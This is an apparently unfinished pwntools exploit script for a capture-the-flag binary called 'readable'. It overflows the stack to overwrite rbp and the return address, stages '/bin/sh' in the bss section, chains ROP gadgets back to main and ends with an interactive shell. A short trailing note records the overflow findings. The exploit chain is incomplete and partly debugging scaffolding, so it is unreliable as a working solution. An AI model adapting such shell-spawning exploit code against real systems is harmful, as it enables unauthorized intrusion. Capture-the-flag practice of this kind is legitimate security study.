#!/usr/bin/env python3

from pwn import *

exe = ELF("./readable")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()


    main = 0x004004fd
    bss = 0x0600910

    pop_rdi = 0x0000000000400593
    pop_rsi = 0x0000000000400591

    gdb.attach(r)
    r.send("A"*0x10 + p64(bss+0x10) + p64(0x00400505))
    r.send("/bin/sh\x00" +  p64(0) + p64(bss+0x18) + p64(main))
    r.send(p64(pop_rdi) +  p64(0) + p64(bss+0x20) + p64(main))

            
    r.interactive()


if __name__ == "__main__":
    main()
'''

################### NOOOOOOOOOOOOOOOOOOTESS ##################
can overwrite rbp and ret addresses

there is main function address on the stack upper???
'''